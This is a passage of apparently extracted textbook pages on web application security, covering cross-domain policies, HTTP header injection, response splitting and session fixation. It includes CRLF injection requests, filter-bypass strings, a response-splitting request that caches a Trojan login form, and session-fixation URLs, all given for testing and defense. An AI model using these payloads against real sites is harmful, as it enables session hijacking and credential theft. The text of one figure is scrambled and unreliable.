    "output": "Stuttard c13.indd V4 - 08/17/2011 Page 524\n524 Chapter 13 n Attacking Users: Other Techniques\nFurthermore, in a technique similar to the CSS injection attack described\npreviously, it was sometimes possible to inject text at appropriate points within\na target application’s HTML response to wrap an arbitrary {...} block around\nsensitive data contained within that response. The whole response could then\nbe included cross-domain as a script to capture the wrapped data.\nNeither of the attacks just described works on current browsers. As this pro-\ncess continues, and browser support for novel syntactic constructs is further\nextended, it is likely that new kinds of cross-domain data capture will become\npossible, targeting applications that were not vulnerable to these attacks before\nthe new browser features were introduced.\nPreventing JavaScript Hijacking\nSeveral preconditions must be in place before a JavaScript hijacking attack can\nbe performed. To prevent such attacks, it is necessary to violate at least one\nof these preconditions. To provide defense-in-depth, it is recommended that\nmultiple precautions be implemented jointly:\nn As for requests that perform sensitive actions, the application should\nuse standard anti-CSRF defenses to prevent cross-domain requests from\nreturning any responses containing sensitive data.\nn When an application dynamically executes JavaScript code from its own\ndomain, it is not restricted to using <script> tags to include the script.\nBecause the request is on-site, client-side code can use XMLHttpRequest to\nretrieve the raw response and perform additional processing on it before it\nis executed as script. This means that the application can insert invalid or\nproblematic JavaScript at the start of the response, which the client applica-\ntion removes before it is processed. For example, the following code causes\nan infi nite loop when executed using a script include but can be stripped\nbefore execution when the script is accessed using XMLHttpRequest:\nfor(;;);\nn Because the application can use XMLHttpRequest to retrieve dynamic script\ncode, it can use POST requests to do so. If the application accepts only POST\nrequests for potentially vulnerable script code, it prevents third-party\nsites from including them using <script> tags.\nThe Same-Origin Policy Revisited\nThis chapter and the preceding one have described numerous examples of\nhow the same-origin policy is applied to HTML and JavaScript, and ways\nin which it can be circumvented via application bugs and browser quirks.\ncc1133..iinndddd 552244 88//1199//22001111 1122::1133::5599 PPMM"
  },
  {
    "input": "The Same-Origin Policy and Browser Extensions",
    "output": "Stuttard c13.indd V4 - 08/17/2011 Page 525\nChapter 13 n Attacking Users: Other Techniques 525\nTo understand more fully the consequences of the same-origin policy for\nweb application security, this section examines some further contexts in\nwhich the policy applies and how certain cross-domain attacks can arise in\nthose contexts.\nThe Same-Origin Policy and Browser Extensions\nThe browser extension technologies that are widely deployed all implement\nsegregation between domains in a way that is derived from the same basic\nprinciples as the main browser same-origin policy. However, some unique\nfeatures exist in each case that can enable cross-domain attacks in some\nsituations.\nThe Same-Origin Policy and Flash\nFlash objects have their origin determined by the domain of the URL from which\nthe object is loaded, not the URL of the HTML page that loads the object. As\nwith the same-origin policy in the browser, segregation is based on protocol,\nhostname, and port number by default.\nIn addition to full two-way interaction with the same origin, Flash objects\ncan initiate cross-domain requests via the browser, using the URLRequest\nAPI. This gives more control over requests than is possible with pure browser\ntechniques, including the ability to specify an arbitrary Content-Type header\nand to send arbitrary content in the body of POST requests. Cookies from the\nbrowser’s cookie jar are applied to these requests, but the responses from\ncross-origin requests cannot by default be read by the Flash object that initi-\nated them.\nFlash includes a facility for domains to grant permission for Flash objects from\nother domains to perform full two-way interaction with them. This is usually\ndone by publishing a policy fi le at the URL /crossdomain.xml on the domain\nthat is granting permission. When a Flash object attempts to make a two-way\ncross-domain request, the Flash browser extension retrieves the policy fi le\nfrom the domain being requested and permits the request only if the requested\ndomain grants access to the requesting domain.\nHere’s an example of the Flash policy fi le published by www.adobe.com:\n<?xml version=”1.0”?>\n<cross-domain-policy>\n<site-control permitted-cross-domain-policies=”by-content-type”/>\n<allow-access-from domain=”*.macromedia.com” />\n<allow-access-from domain=”*.adobe.com” />\n<allow-access-from domain=”*.photoshop.com” />\n<allow-access-from domain=”*.acrobat.com” />\n</cross-domain-policy>\ncc1133..iinndddd 552255 88//1199//22001111 1122::1133::5599 PPMM\nStuttard c13.indd V4 - 08/17/2011 Page 526\n526 Chapter 13 n Attacking Users: Other Techniques\nHACK STEPS\nYou should always check for the /crossdomain.xml fi le on any web applica-\ntion you are testing. Even if the application itself does not use Flash, if per-\nmission is granted to another domain, Flash objects issued by that domain are\npermitted to interact with the domain that publishes the policy.\nn If the application allows unrestricted access (by specifying <allow-\naccess-from domain=”*” />), any other site can perform two-way\ninteraction, riding on the sessions of application users. This would allow\nall data to be retrieved, and any user actions to be performed, by any\nother domain.\nn If the application allows access to subdomains or other domains used by\nthe same organization, two-way interaction is, of course, possible from\nthose domains. This means that vulnerabilities such as XSS on those\ndomains may be exploitable to compromise the domain that grants per-\nmission. Furthermore, if an attacker can purchase Flash-based advertis-\ning on any allowed domain, the Flash objects he deploys can be used to\ncompromise the domain that grants permission.\nn Some policy fi les disclose intranet hostnames or other sensitive informa-\ntion that may be of use to an attacker.\nA further point of note is that a Flash object may specify a URL on the target\nserver from which the policy fi le should be downloaded. If a top-level policy\nfi le is not present in the default location, the Flash browser tries to download a\npolicy from the specifi ed URL. To be processed, the response to this URL must\ncontain a validly formatted policy fi le and must specify an XML or text-based\nMIME type in the Content-Type header. Currently most domains on the web do\nnot publish a Flash policy fi le at /crossdomain.xml, perhaps on the assumption\nthat the default behavior with no policy is to disallow any cross-domain access.\nHowever, this overlooks the possibility of third-party Flash objects specifying\na custom URL from which to download a policy. If an application contains any\nfunctionality that an attacker could leverage to place an arbitrary XML fi le into\na URL on the application’s domain, it may be vulnerable to this attack.\nThe Same-Origin Policy and Silverlight\nThe same-origin policy for Silverlight is largely based on the policy that is\nimplemented by Flash. Silverlight objects have their origin determined by the\ndomain of the URL from which the object is loaded, not the URL of the HTML\npage that loads the object.\ncc1133..iinndddd 552266 88//1199//22001111 1122::1133::5599 PPMM\nStuttard c13.indd V4 - 08/17/2011 Page 527\nChapter 13 n Attacking Users: Other Techniques 527\nOne important difference between Silverlight and Flash is that Silverlight does\nnot segregate origins based on protocol or port, so objects loaded via HTTP can\ninteract with HTTPS URLs on the same domain.\nSilverlight uses its own cross-domain policy fi le, located at /clientaccess-\npolicy.xml. Here’s an example of the Silverlight policy fi le published by www.\nmicrosoft.com:\n<?xml version=”1.0” encoding=”utf-8”?>\n<access-policy>\n<cross-domain-access>\n<policy>\n<allow-from >\n<domain uri=”http://www.microsoft.com”/>\n<domain uri=”http://i.microsoft.com”/>\n<domain uri=”http://i2.microsoft.com”/>\n<domain uri=”http://i3.microsoft.com”/>\n<domain uri=”http://i4.microsoft.com”/>\n<domain uri=”http://img.microsoft.com”/>\n</allow-from>\n<grant-to>\n<resource path=”/” include-subpaths=”true”/>\n</grant-to>\n</policy>\n</cross-domain-access>\n</access-policy>\nThe same considerations as already discussed for the Flash cross-domain\npolicy fi le apply to Silverlight, with the exception that Silverlight does not allow\nan object to specify a nonstandard URL for the policy fi le.\nIf the Silverlight policy fi le is not present on a server, the Silverlight browser\nextension attempts to load a valid Flash policy fi le from the default location. If\nthe fi le is present, the extension processes that instead.\nThe Same-Origin Policy and Java\nJava implements segregation between origins in a way that is largely based on\nthe browser’s same-origin policy. As with other browser extensions, Java applets\nhave their origin determined by the domain of the URL from which the applet\nis loaded, not the URL of the HTML page that loads the object.\nOne important difference with the Java same-origin policy is that other\ndomains that share the IP address of the originating domain are considered\nto be same-origin under some circumstances. This can lead to limited cross-\ndomain interaction in some shared hosting situations.\nJava currently has no provision for a domain to publish a policy allowing\ninteraction from other domains.\ncc1133..iinndddd 552277 88//1199//22001111 1122::1133::5599 PPMM"
  },
  {
    "input": "The Same-Origin Policy and HTML5",
    "output": "Stuttard c13.indd V4 - 08/17/2011 Page 528\n528 Chapter 13 n Attacking Users: Other Techniques\nThe Same-Origin Policy and HTML5\nAs originally conceived, XMLHttpRequest allows requests to be issued only to\nthe same origin as the invoking page. With HTML5, this technology is being\nmodifi ed to allow two-way interaction with other domains, provided that the\ndomains being accessed give permission to do so.\nPermission for cross-domain interaction is implemented using a range of new\nHTTP headers. When a script attempts to make a cross-domain request using\nXMLHttpRequest, the way this is processed depends on the details of the request:\nn For “normal” requests, the kind that can be generated cross-domain using\nexisting HTML constructs, the browser issues the request and inspects\nthe resulting response headers to determine whether the invoking script\nshould be allowed to access the response from the request.\nn Other requests that cannot be generated using existing HTML, such as\nthose using a nonstandard HTTP method or Content-Type, or that add\ncustom HTTP headers, are handled differently. The browser fi rst makes an\nOPTIONS request to the target URL and then inspects the response headers\nto determine whether the request being attempted should be permitted.\nIn both cases, the browser adds an Origin header to indicate the domain from\nwhich the cross-domain request is being attempted:\nOrigin: http://wahh-app.com\nTo identify domains that may perform two-way interaction, the server’s\nresponse includes the Access-Control-Allow-Origin header, which may include\na comma-separated list of accepted domains and wildcards:\nAccess-Control-Allow-Origin: *\nIn the second case, where cross-domain requests are prevalidated using an\nOPTIONS request, headers like the following may be used to indicate the details\nof the request that is to be attempted:\nAccess-Control-Request-Method: PUT\nAccess-Control-Request-Headers: X-PINGOTHER\nIn response to the OPTIONS request, the server may use headers like the fol-\nlowing to specify the types of cross-domain requests that are allowed:\nAccess-Control-Allow-Origin: http://wahh-app.com\nAccess-Control-Allow-Methods: POST, GET, OPTIONS\nAccess-Control-Allow-Headers: X-PINGOTHER\nAccess-Control-Max-Age: 1728000\ncc1133..iinndddd 552288 88//1199//22001111 1122::1133::5599 PPMM"
  },
  {
    "input": "Crossing Domains with Proxy Service Applications",
    "output": "Stuttard c13.indd V4 - 08/17/2011 Page 529\nChapter 13 n Attacking Users: Other Techniques 529\nHACK STEPS\n1. To test an application’s handling of cross-domain requests using\nXMLHttpRequest, you should try adding an Origin header specifying a\ndifferent domain, and examine any Access-Control headers that are\nreturned. The security implications of allowing two-way access from any\ndomain, or from specified other domains, are the same as those described\nfor the Flash cross-domain policy.\n2. If any cross-domain access is supported, you should also use OPTIONS\nrequests to understand exactly what headers and other request details\nare permitted.\nIn addition to the possibility of allowing two-way interaction from external\ndomains, the new features in XMLHttpRequest may lead to new kinds of attacks\nexploiting particular features of web applications, or new attacks in general.\nAs described in Chapter 12, some applications use XMLHttpRequest to make\nasynchronous requests for fi les that are specifi ed within a URL parameter, or\nafter the fragment identifi er. The retrieved fi le is dynamically loaded into a <div>\non the current page. Since cross-domain requests were previously not possible\nusing XMLHttpRequest, it was not necessary to validate that the requested item\nwas on the application’s own domain. With the new version of XMLHttpRequest,\nan attacker may be able to specify a URL on a domain he controls, thereby\nperforming client-side remote fi le inclusion attacks against application users.\nMore generally, the new features of XMLHttpRequest provide new ways for a\nmalicious or compromised website to deliver attacks via the browsers of visiting\nusers, even where cross-domain access is denied. Cross-domain port scanning\nhas been demonstrated, using XMLHttpRequest to make attempted requests\nfor arbitrary hosts and ports, and observing timing differences in responses\nto infer whether the requested port is open, closed, or fi ltered. Furthermore,\nXMLHttpRequest may be used to deliver distributed denial-of-service attacks\nat a much faster rate than is possible using older methods of generating cross-\ndomain requests. If cross-domain access is denied by the targeted application,\nit is necessary to increment a value in a URL parameter to ensure that each\nrequest is for a different URL and therefore is actually issued by the browser.\nCrossing Domains with Proxy Service Applications\nSome publicly available web applications effectively function as proxy services,\nallowing content to be retrieved from a different domain but served to the\ncc1133..iinndddd 552299 88//1199//22001111 1122::1133::5599 PPMM\nStuttard c13.indd V4 - 08/17/2011 Page 530\n530 Chapter 13 n Attacking Users: Other Techniques\nuser from within the proxying web application. An example of this is Google\nTranslate (GT), which requests a specifi ed external URL and returns its contents,\nas shown in Figure 13-2. (Although the translation engine may modify text\nwithin the retrieved response, the underlying HTML markup and any script\ncode are unmodifi ed).\nFigure 13-2: Google Translate can be used to request an external URL, and return its\ncontents, with text in the response translated into a specified language\nWhere this gets interesting is if two different external domains are both\naccessed via the GT application. When this happens, as far as the browser is\nconcerned, the content from each external domain now resides within the GT\ndomain, since this is the domain from which it was retrieved. Since the two\nsets of content reside on the same domain, two-way interaction between them\nis possible if this is also carried out via the GT domain.\nOf course, if a user is logged in to an external application and then accesses\nthe application via GT, her browser correctly treats GT as a different domain.\nTherefore, the user’s cookies for the external application are not sent in the\nrequests via GT, nor is any other interaction possible. Hence, a malicious website\ncannot easily leverage GT to compromise users’ sessions on other applications.\nHowever, the behavior of proxy services such as GT can enable one web-\nsite to perform two-way interaction with the public, unauthenticated areas\nof an application on a different domain. One example of this attack is Jikto, a\ncc1133..iinndddd 553300 88//1199//22001111 1122::1144::0000 PPMM"
  },
  {
    "input": "HTTP Header Injection",
    "output": "Stuttard c13.indd V4 - 08/17/2011 Page 531\nChapter 13 n Attacking Users: Other Techniques 531\nproof-of-concept worm that can spread between web applications by fi nding\nand exploiting persistent XSS vulnerabilities in them. In essence, Jikto’s code\nworks in the following way:\nn When it fi rst runs, the script checks whether it is running in the GT domain.\nIf not, it reloads the current URL via the GT domain, effectively to transfer\nitself into that domain.\nn The script requests content from an external domain via GT. Since the\nscript itself is running in the GT domain, it can perform two-way interac-\ntion with public content on any other domain via GT.\nn The script implements a basic web scanner in JavaScript to probe the\nexternal domain for persistent XSS fl aws. Such vulnerabilities may arise\nwithin publicly accessible functions such as message boards.\nn When a suitable vulnerability is identifi ed, the script exploits this to upload\na copy of itself into the external domain.\nn When another user visits the compromised external domain, the script is\nexecuted, and the process repeats itself.\nThe Jikto worm seeks to exploit XSS fl aws to self-propagate. However, the\nbasic attack technique of merging domains via proxy services does not depend\non any vulnerability in the individual external applications that are targeted,\nand cannot realistically be defended against. Nevertheless, it is of interest as an\nattack technique in its own right. It is also a useful topic to test your understand-\ning of how the same-origin policy applies in unusual situations.\nOther Client-Side Injection Attacks\nMany of the attacks we have examined so far involve leveraging some applica-\ntion function to inject crafted content into application responses. The prime\nexample of this is XSS attacks. We have also seen the technique used to capture\ndata cross-domain via injected HTML and CSS. This section examines a range\nof other attacks involving injection into client-side contexts.\nHTTP Header Injection\nHTTP header injection vulnerabilities arise when user-controllable data is\ninserted in an unsafe manner into an HTTP header returned by the applica-\ntion. If an attacker can inject newline characters into the header he controls, he\ncan insert additional HTTP headers into the response and can write arbitrary\ncontent into the body of the response.\nThis vulnerability arises most commonly in relation to the Location and\nSet-Cookie headers, but it may conceivably occur for any HTTP header. You\nsaw previously how an application may take user-supplied input and insert it\ncc1133..iinndddd 553311 88//1199//22001111 1122::1144::0000 PPMM\nStuttard c13.indd V4 - 08/17/2011 Page 532\n532 Chapter 13 n Attacking Users: Other Techniques\ninto the Location header of a 3xx response. In a similar way, some applications\ntake user-supplied input and insert it into the value of a cookie. For example:\nGET /settings/12/Default.aspx?Language=English HTTP/1.1\nHost: mdsec.net\nHTTP/1.1 200 OK\nSet-Cookie: PreferredLanguage=English\n...\nIn either of these cases, it may be possible for an attacker to construct a crafted\nrequest using the carriage-return (0x0d) and/or line-feed (0x0a) characters to\ninject a newline into the header he controls and therefore insert further data\non the following line:\nGET /settings/12/Default.aspx?Language=English%0d%0aFoo:+bar HTTP/1.1\nHost: mdsec.net\nHTTP/1.1 200 OK\nSet-Cookie: PreferredLanguage=English\nFoo: bar\n...\nExploiting Header Injection Vulnerabilities\nPotential header injection vulnerabilities can be detected in a similar way to\nXSS vulnerabilities, since you are looking for cases where user-controllable\ninput reappears anywhere within the HTTP headers returned by the applica-\ntion. Hence, in the course of probing the application for XSS vulnerabilities, you\nshould also identify any locations where the application may be vulnerable to\nheader injection.\nHACK STEPS\n1. For each potentially vulnerable instance in which user-controllable input\nis copied into an HTTP header, verify whether the application accepts data\ncontaining URL-encoded carriage-return (%0d) and line-feed (%0a) charac-\nters, and whether these are returned unsanitized in its response.\n2. Note that you are looking for the actual newline characters themselves to\nappear in the server’s response, not their URL-encoded equivalents. If you\nview the response in an intercepting proxy, you should see an additional\nline in the HTTP headers if the attack was successful.\n3. If only one of the two newline characters is returned in the server’s\nresponses, it may still be possible to craft a working exploit, depending on\nthe context.\ncc1133..iinndddd 553322 88//1199//22001111 1122::1144::0000 PPMM\nStuttard c13.indd V4 - 08/17/2011 Page 533\nChapter 13 n Attacking Users: Other Techniques 533\n4. If you find that the application is blocking or sanitizing newline charac-\nters, attempt the following bypasses:\nfoo%00%0d%0abar\nfoo%250d%250abar\nfoo%%0d0d%%0a0abar\nWARNING Issues such as these are sometimes missed through overreliance\non HTML source code and/or browser plug-ins for information, which do not\nshow the response headers. Ensure that you are reading the HTTP response\nheaders using an intercepting proxy tool.\nIf it is possible to inject arbitrary headers and message body content into the\nresponse, this behavior can be used to attack other users of the application in\nvarious ways.\nTRY IT!\nhttp://mdsec.net/settings/12/\nhttp://mdsec.net/settings/31/\nInjecting Cookies\nA URL can be constructed that sets arbitrary cookies within the browser of any\nuser who requests it:\nGET /settings/12/Default.aspx?Language=English%0d%0aSet-\nCookie:+SessId%3d120a12f98e8; HTTP/1.1\nHost: mdsec.net\nHTTP/1.1 200 OK\nSet-Cookie: PreferredLanguage=English\nSet-Cookie: SessId=120a12f98e8;\n...\nIf suitably confi gured, these cookies may persist across different browser\nsessions. Target users can be induced to access the malicious URL via the same\ndelivery mechanisms that were described for refl ected XSS vulnerabilities\n(e-mail, third-party website, and so on).\nDelivering Other Attacks\nBecause HTTP header injection enables an attacker to control the entire body\nof a response, it can be used as a delivery mechanism for practically any attack\nagainst other users, including virtual website defacement, script injection, arbi-\ntrary redirection, attacks against ActiveX controls, and so on.\ncc1133..iinndddd 553333 88//1199//22001111 1122::1144::0000 PPMM\nStuttard c13.indd V4 - 08/17/2011 Page 534\n534 Chapter 13 n Attacking Users: Other Techniques\nHTTP Response Splitting\nThis attack technique seeks to poison a proxy server’s cache with malicious\ncontent to compromise other users who access the application via the proxy. For\nexample, if all users on a corporate network access an application via a cach-\ning proxy, the attacker can target them by injecting malicious content into the\nproxy’s cache, which is displayed to any users who request the affected page.\nAn attacker can exploit a header injection vulnerability to deliver a response\nsplitting attack by following these steps:\n1. The attacker chooses a page of the application that he wants to poison\nwithin the proxy cache. For example, he might replace the page at /admin/\nwith a Trojan login form that submits the user’s credentials to the attacker’s\nserver.\n2. The attacker locates a header injection vulnerability and formulates a\nrequest that injects an entire HTTP body into the response, plus a second\nset of response headers and a second response body. The second response\nbody contains the HTML source code for the attacker’s Trojan login form.\nThe effect is that the server’s response looks exactly like two separate\nHTTP responses chained together. This is where the attack technique gets\nits name, because the attacker has effectively “split” the server’s response\ninto two separate responses. For example:\nGET /settings/12/Default.aspx?Language=English%0d%0aContent-Length:+22\n%0d%0a%0d%0a<html>%0d%0afoo%0d%0a</html>%0d%0aHTTP/1.1+200+OK%0d%0a\nContent-Length:+2307%0d%0a%0d%0a<html>%0d%0a<head>%0d%0a<title>\nAdministrator+login</title>0d%0a[...long URL...] HTTP/1.1\nHost: mdsec.net\nHTTP/1.1 200 OK\nSet-Cookie: PreferredLanguage=English\nContent-Length: 22\n<html>\nfoo\n</html>\nHTTP/1.1 200 OK\nContent-Length: 2307\n<html>\n<head>\n<title>Administrator login</title>\n...\n3. The attacker opens a TCP connection to the proxy server and sends his\ncrafted request, followed immediately by a request for the page to be\npoisoned. Pipelining requests in this way is legal in the HTTP protocol:\ncc1133..iinndddd 553344 88//1199//22001111 1122::1144::0000 PPMM\nStuttard c13.indd V4 - 08/17/2011 Page 535\nChapter 13 n Attacking Users: Other Techniques 535\nGET http://mdsec.net/settings/12/Default.aspx?Language=English%0d%0a\nContent-Length:+22%0d%0a%0d%0a<html>%0d%0afoo%0d%0a</html>%0d%0aHTTP/\n1.1+200+OK%0d%0aContent-Length:+2307%0d%0a%0d%0a<html>%0d%0a<head>%0d%0a\n<title>Administrator+login</title>0d%0a[...long URL...] HTTP/1.1\nHost: mdsec.net\nProxy-Connection: Keep-alive\nGET http://mdsec.net/admin/ HTTP/1.1\nHost: mdsec.net\nProxy-Connection: Close\n4. The proxy server opens a TCP connection to the application and sends\nthe two requests pipelined in the same way.\n5. The application responds to the fi rst request with the attacker’s injected\nHTTP content, which looks exactly like two separate HTTP responses.\n6. The proxy server receives these two apparent responses and interprets the\nsecond as being the response to the attacker’s second pipelined request,\nwhich was for the URL http://mdsec.net/admin/. The proxy caches this\nsecond response as the contents of this URL. (If the proxy has already stored\na cached copy of the page, the attacker can cause it to rerequest the URL\nand update its cache with the new version by inserting an appropriate\nIf-Modified-Since header into his second request and a Last-Modified\nheader into the injected response.)\n7. The application issues its actual response to the attacker’s second request,\ncontaining the authentic contents of the URL http://mdsec.net/admin/.\nThe proxy server does not recognize this as being a response to a request\nthat it actually issued and therefore discards it.\n8. A user accesses http://mdsec.net/admin/ via the proxy server and receives\nthe content of this URL that was stored in the proxy’s cache. This content\nis in fact the attacker’s Trojan login form, so the user’s credentials are\ncompromised.\nThe steps involved in this attack are illustrated in Figure 13-3.\nGET/home.php?uid=123 causes split\nRequest 1 HTTP/1.1 OK\n%0d%0aContent-Length... response\nResponse to request 1\ncached\nRequest 2 GET/admin HTTP/1.1 OK\nignored HTTP/1.1 OK Response to request 2\nFigure 13-3: The steps involved in an HTTP response splitting attack that poisons a\nproxy server cache\ncc1133..iinndddd 553355 88//1199//22001111 1122::1144::0000 PPMM"
  },
  {
    "input": "Cookie Injection",
    "output": "Stuttard c13.indd V4 - 08/17/2011 Page 536\n536 Chapter 13 n Attacking Users: Other Techniques\nPreventing Header Injection Vulnerabilities\nThe most effective way to prevent HTTP header injection vulnerabilities is to\nnot insert user-controllable input into the HTTP headers that the application\nreturns. As you saw with arbitrary redirection vulnerabilities, safer alternatives\nto this behavior usually are available.\nIf it is considered unavoidable to insert user-controllable data into HTTP\nheaders, the application should employ a twofold defense-in-depth approach\nto prevent any vulnerabilities from arising:\nn Input validation—The application should perform context-dependent\nvalidation of the data being inserted in as strict a manner as possible.\nFor example, if a cookie value is being set based on user input, it may be\nappropriate to restrict this to alphabetical characters only and a maximum\nlength of 6 bytes.\nn Output validation—Every piece of data being inserted into headers should\nbe fi ltered to detect potentially malicious characters. In practice, any char-\nacter with an ASCII code below 0x20 should be regarded as suspicious,\nand the request should be rejected.\nApplications can prevent any remaining header injection vulnerabilities from\nbeing used to poison proxy server caches by using HTTPS for all application\ncontent, provided that the application does not employ a caching reverse-proxy\nserver behind its SSL terminator.\nCookie Injection\nIn cookie injection attacks, the attacker leverages some feature of an applica-\ntion’s functionality, or browser behavior, to set or modify a cookie within the\nbrowser of a victim user.\nAn attacker may be able to deliver a cookie injection attack in various ways:\nn Some applications contain functionality that takes a name and value in\nrequest parameters and sets these within a cookie in the response. A\ncommon example where this occurs is in functions for persisting user\npreferences.\nn As already described, if an HTTP header injection vulnerability exists,\nthis can be exploited to inject arbitrary Set-Cookie headers.\nn XSS vulnerabilities in related domains can be leveraged to set a cookie on\na targeted domain. Any subdomains of the targeted domain itself, and\nof its parent domains and their subdomains, can all be used in this way.\nn An active man-in-the-middle attack (for example, against users on a public\nwireless network) can be used to set cookies for arbitrary domains, even\ncc1133..iinndddd 553366 88//1199//22001111 1122::1144::0000 PPMM\nStuttard c13.indd V4 - 08/17/2011 Page 537\nChapter 13 n Attacking Users: Other Techniques 537\nif the targeted application uses only HTTPS and its cookies are fl agged as\nsecure. This kind of attack is described in more detail later in this chapter.\nIf an attacker can set an arbitrary cookie, this can be leveraged in various\nways to compromise the targeted user:\nn Depending on the application, setting a specifi c cookie may interfere\nwith the application’s logic to the user’s disadvantage (for example,\nUseHttps=false).\nn Since cookies usually are set only by the application itself, they may be\ntrusted by client-side code. This code may process cookie values in ways\nthat are dangerous for attacker-controllable data, leading to DOM-based\nXSS or JavaScript injection.\nn Instead of tying anti-CSRF tokens to a user’s session, some applications\nwork by placing the token into both a cookie and a request parameter and\nthen comparing these values to prevent CSRF attacks. If the attacker controls\nboth the cookie and the parameter value, this defense can be bypassed.\nn As was described earlier in this chapter, some same-user persistent XSS\ncan be exploited via a CSRF attack against the login function to log the user\nin to the attacker’s account and therefore access the XSS payload. If the\nlogin page is robustly protected against CSRF, this attack fails. However,\nif the attacker can set an arbitrary cookie in the user’s browser, he can\nperform the same attack by passing his own session token directly to the\nuser, bypassing the need for a CSRF attack against the login function.\nn Setting arbitrary cookies can allow session fi xation vulnerabilities to be\nexploited, as described in the next section.\nSession Fixation\nSession fi xation vulnerabilities typically arise when an application creates an\nanonymous session for each user when she fi rst accesses the application. If the\napplication contains a login function, this anonymous session is created prior\nto login and then is upgraded to an authenticated session after the user logs in.\nThe same token that initially confers no special access later allows privileged\naccess within the security context of the authenticated user.\nIn a standard session hijacking attack, the attacker must use some means to\ncapture the session token of an application user. In a session fi xation attack, on\nthe other hand, the attacker fi rst obtains an anonymous token directly from\nthe application and then uses some means to fi x this token within a victim’s\nbrowser. After the user has logged in, the attacker can use the token to hijack\nthe user’s session.\nFigure 13-4 shows the steps involved in a successful session fi xation attack.\ncc1133..iinndddd 553377 88//1199//22001111 1122::1144::0011 PPMM\nStuttard c13.indd V4 - 08/17/2011 Page 538\n538 Chapter 13 n Attacking Users: Other Techniques\nApplication\n3. Use r r e c lo e g iv s e d in f u ro s m in g th t e h e a t t t o a k c e k n er usin 4 g . A th a tt n e a d c s k a is 1 e m r . i e s A h s t i t u j o t a a e k c c d e k k n s w e r a u i t s r s h e e t q h a r’ u e s s e e u s s s s e t s s e s i r s o /l i n o o g n to in k . e p n hp\n2. Attacker feeds the session token to the user\nUser Attacker\nFigure 13-4: The steps involved in a session fixation attack\nThe key stage in this attack is, of course, the point at which the attacker feeds\nto the victim the session token he has acquired, thereby causing the victim’s\nbrowser to use it. The ways in which this can be done depend on the mechanism\nused to transmit session tokens:\nn If HTTP cookies are used, the attacker can try to use one of the cookie\ninjection techniques, as described in the preceding section.\nn If session tokens are transmitted within a URL parameter, the attacker can\nsimply feed the victim the same URL that the application issued to him:\nhttps://wahh-app.com/login.php?SessId=12d1a1f856ef224ab424c2454208\nn Several application servers accept use of their session tokens within the\nURL, delimited by a semicolon. In some applications this is done by default,\nand in others, the application tolerates explicit use in this manner even if\nthe servers don’t behave in this way by default:\nhttp://wahh-app.com/store/product.do;jsessionid=739105723F7AEE6ABC2\n13F812C184204.ASTPESD2\nn If the application uses hidden fi elds in HTML forms to transmit session\ntokens, the attacker may be able to use a CSRF attack to introduce his\ntoken into the user’s browser.\nSession fi xation vulnerabilities can also exist in applications that do not\ncontain login functionality. For example, an application may allow anonymous\ncc1133..iinndddd 553388 88//1199//22001111 1122::1144::0011 PPMM\nStuttard c13.indd V4 - 08/17/2011 Page 539\nChapter 13 n Attacking Users: Other Techniques 539\nusers to browse a catalog of products, place items into a shopping cart, check\nout by submitting personal data and payment details, and then review all this\ninformation on a Confi rm Order page. In this situation, an attacker may fi x an\nanonymous session token with a victim’s browser, wait for that user to place\nan order and submit sensitive information, and then access the Confi rm Order\npage using the token to capture the user’s details.\nSome web applications and web servers accept arbitrary tokens submitted\nby users, even if these were not previously issued by the server itself. When\nan unrecognized token is received, the server simply creates a new session\nfor it and handles it exactly as if it were a new token generated by the server.\nMicrosoft IIS and Allaire ColdFusion servers have been vulnerable to this\nweakness in the past.\nWhen an application or server behaves in this way, attacks based on ses-\nsion fi xation are made considerably easier because the attacker does not need\nto take any steps to ensure that the tokens fi xed in target users’ browsers are\ncurrently valid. The attacker can simply choose an arbitrary token and dis-\ntribute it as widely as possible (for example, by e-mailing a URL containing\nthe token to individual users, mailing lists, and so on). Then the attacker can\nperiodically poll a protected page within the application (such as My Details)\nto detect when a victim has used the token to log in. Even if a targeted user\ndoes not follow the URL for several months, a determined attacker may still\nbe able hijack her session.\nFinding and Exploiting Session Fixation Vulnerabilities\nIf the application supports authentication, you should review how it handles session\ntokens in relation to the login. The application may be vulnerable in two ways:\nn The application issues an anonymous session token to each unauthenti-\ncated user. When the user logs in, no new token is issued. Instead, her\nexisting session is upgraded to an authenticated session. This behavior\nis common when the application uses the application server’s default\nsession-handling mechanism.\nn The application does not issue tokens to anonymous users, and a token\nis issued only following a successful login. However, if a user accesses\nthe login function using an authenticated token and logs in using dif-\nferent credentials, no new token is issued. Instead, the user associated\nwith the previously authenticated session is changed to the identity of\nthe second user.\nIn both of these cases, an attacker can obtain a valid session token (either by\nsimply requesting the login page or by performing a login with his own cre-\ndentials) and feed this to a target user. When that user logs in using the token,\nthe attacker can hijack the user’s session.\ncc1133..iinndddd 553399 88//1199//22001111 1122::1144::0011 PPMM"
  },
  {
    "input": "Open Redirection Vulnerabilities",
    "output": "Stuttard c13.indd V4 - 08/17/2011 Page 540\n540 Chapter 13 n Attacking Users: Other Techniques\nHACK STEPS\n1. Obtain a valid token by whatever means the application enables you to\nobtain one.\n2. Access the login form, and perform a login using this token.\n3. If the login is successful and the application does not issue a new token,\nit is vulnerable to session fixation.\nIf the application does not support authentication but does allow users to submit\nand then review sensitive information, you should verify whether the same session\ntoken is used before and after the initial submission of user-specifi c information. If\nit is, an attacker can obtain a token and feed it to a target user. When the user sub-\nmits sensitive details, the attacker can use the token to view the user’s information.\nHACK STEPS\n1. Obtain a session token as a completely anonymous user, and then walk\nthrough the process of submitting sensitive data, up until any page at\nwhich the sensitive data is displayed back.\n2. If the same token originally obtained can now be used to retrieve the sen-\nsitive data, the application is vulnerable to session fixation.\n3. If any type of session fixation is identified, verify whether the server\naccepts arbitrary tokens it has not previously issued. If it does, the vulner-\nability is considerably easier to exploit over an extended period.\nPreventing Session Fixation Vulnerabilities\nAt any point when a user interacting with the application transitions from being\nanonymous to being identifi ed, the application should issue a fresh session token.\nThis applies both to a successful login and to cases in which an anonymous\nuser fi rst submits personal or other sensitive information.\nAs a defense-in-depth measure to further protect against session fi xation\nattacks, many security-critical applications employ per-page tokens to supple-\nment the main session token. This technique can frustrate most kinds of session\nhijacking attacks. See Chapter 7 for further details.\nThe application should not accept arbitrary session tokens that it does not\nrecognize as having issued itself. The token should be immediately canceled\nwithin the browser, and the user should be returned to the application’s start page.\nOpen Redirection Vulnerabilities\nOpen redirection vulnerabilities arise when an application takes user-controllable\ninput and uses it to perform a redirection, instructing the user’s browser to\ncc1133..iinndddd 554400 88//1199//22001111 1122::1144::0011 PPMM\nStuttard c13.indd V4 - 08/17/2011 Page 541\nChapter 13 n Attacking Users: Other Techniques 541\nvisit a different URL than the one 